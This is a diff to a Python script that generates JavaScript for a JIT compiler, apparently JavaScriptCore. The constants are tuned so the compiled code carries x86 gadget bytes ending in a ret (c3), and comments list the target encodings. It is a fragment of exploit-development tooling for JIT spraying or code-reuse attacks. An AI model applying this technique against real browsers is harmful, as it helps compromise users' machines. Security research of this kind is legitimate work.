@@ -66,12 +66,12 @@ function syscall_jsc('''
         base += 1
     
 
-    jsc = '\t\tvar s = t' + str(0) + ' * 2 + t' + str(1) + ' + 0xc3;\n    return  '
+    jsc = '\t\tvar s = t' + str(1) + ' - 0x3d;\n    return  '
 
-    middle2 = ''
+    middle = ''
     for i in range(count - 1):
-        middle2 += 't' + str(i) + ' ' + '+ '
-    middle2 += 't' + str(count-1) + ' | s;\n}\n'
+        middle += 't' + str(i) + ' ' + '+ '
+    middle += 't' + str(count-1) + ' | s;\n}\n'
 
     tail = '''
 for(var i = 0; i < 0x10000; i++)
@@ -83,7 +83,11 @@ for(var i = 0; i < 0x10000; i++)
     tail += '0xc' + str(count - 1) + ');'
     tail += '\n}\n'
 
-    excute_js(header + middle1 + jsc + middle2 + tail, 'test')
+    indent = ''
+    for i in range(12):
+        for j in range(i):
+            indent += '\t\tvar i' + str(j)
+    excute_js(header + middle1 + jsc + middle + tail, 'test')
 
 def gen_jsc(r1:str, r2:str):
     base = 110
@@ -101,7 +105,7 @@ def gen_jsc(r1:str, r2:str):
 
 def gen_syscall(r1:str, r2:str):
     base = 110
-    jsc = '\tvar s = t' + str(int(rs_map[r1]) - base) + ' + t' + str(int(rs_map[r2]) - base) + ' * 1 + 0x5;\n'
+    jsc = '\tvar s = t' + str(int(rs_map[r2]) - base) + ' - 0x3d;\n'
     jsc += '\treturn '
     l = False
     for i in range(count):
@@ -131,6 +135,12 @@ def generate_js(filename:str):
         i += 1
 
     base = 110
+
+    # 48 8d 5a c3             lea    rbx,[rdx-0x3d]
+    # 48 8d 5e c3             lea    rbx,[rsi-0x3d]
+    # 48 8d 58 c3             lea    rbx,[rax-0x3d]
+    # 48 8d 5f c3             lea    rbx,[rdi-0x3d]
+
     # 428d945ac3000000 ;leal rdx,[rdx+r11*2+0xc3]
     jsc5ac3 = gen_jsc('rdx', 'r11')
     if not excute_js(header + jsc5ac3 + tail, '5ac3'):
